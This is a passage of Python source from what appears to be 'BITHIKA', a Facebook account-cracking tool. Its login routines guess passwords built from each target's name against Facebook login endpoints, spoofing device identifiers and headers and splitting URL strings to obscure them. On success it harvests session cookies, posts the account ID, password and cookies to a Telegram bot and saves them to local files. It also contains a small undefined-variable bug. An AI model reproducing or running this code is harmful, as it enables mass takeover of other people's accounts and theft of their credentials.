            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}BITHIKA-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
                cek_apk(kuki)
                oks.append(ids)
                statusok = (f" {ids} | {pas} | {kuki} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/BITHIKA-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/BITHIKA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDFIVE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{animasi}-M5{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = DEF5()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            secure_family_device_id = str(uuid.uuid4()).upper()
            data = {
                "adid": f"{adid}",
                "device_id": f"{device_id}",
                "family_device_id": f"{family_device_id}",
                "secure_family_device_id": f"{secure_family_device_id}",
                "advertiser_id": f"{advertiser_id}",
                "format": "json",
                "cpl": "true",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "register_api",
                "email": ids,
                "password": pas,
                "access_token": "275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "NO_FILE",     
                "currently_logged_in_userid": "0",
                "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "sig": "cc331688c9ec07059af4df9dbdcf7737"}
            headers = [
                "Host: graph.facebook.com",
                "Authorization: OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                f"X-FB-Net-HNI: {netheni}",
                f"X-FB-SIM-HNI: {simheni}",
                f"User-Agent: {user_agent}",
                "X-FB-Client-IP: True",
                "X-FB-Request-Analytics-Tags: graphservice",
                "X-Tigon-Is-Retry: False",
                "X-FB-HTTP-Engine: Liger",
                "X-FB-Connection-Quality: MOBILE.LTE",
                "X-FB-Server-Cluster: True",
                "Connection: keep-alive",
                "x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62",         
                "X-FB-Connection-Bandwidth: 80025933",
                "X-FB-Friendly-Name: ViewerReactionsMutation",
                "Accept-Encoding: gzip, deflate",
                "X-FB-Connection-Type: MOBILE.LTE",
                "Content-Type: application/x-www-form-urlencoded",
            ]
            url = "https://b-gr"+"aph.face"+"book.com/auth/login?incl"+"ude_head"+"ers=false&d"+"ecode_body_json=false&stre"+"amable_json_resp"+"onse=true"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://b-gr'+'aph.face'+'book.com/aut'+'h/login?include_h'+'eaders=false&de'+'code_body_json=false&str'+'eamable_json_resp'+'onse=true')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}BITHIKA-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[??]{rad}]: {warna}{kuki}")
                cek_apk(kuki)
                oks.append(ids)
                statusok = (f" {ids} | {pas} | {kuki} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/BITHIKA-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/BITHIKA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass

def __MTDSIX__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{animasi}-M6{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            warna = random.choice(my_color)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            data = {
    "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
   "try_number":"0",
   "unrecognized_tries":"0",
   "email":ids,
   "pass":pas,
   "login":"Log In"}
            headers ={'authority':'m.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="99", "Chromium";v="106"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=data,headers=headers).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                cid = coki[65:80]
                print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
                cek_apk(kuki)
                oks.append(cid)
                statusok = (f" {cid} | {pas} | {kuki} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/ATOM-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                break
            elif "checkpoint" in log_cookies:
                cps.append(ids)
                print(f'\r\r{rad}[ATOM-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/ATOM-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(50)
    except Exception as e:
        pass

        pass	
#----------------[ ID-CHECKER ]--------------------------#

def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m➛ %s%s"%(P,H,game[i].replace("Added on"," Added on")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m➛ %s"%(P,game[i].replace("Expired"," Expired")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
#-----------------------[ SYSTEM-CONTROL ]--------------------#
os.system("clear")
#Process()
BITHIKA()
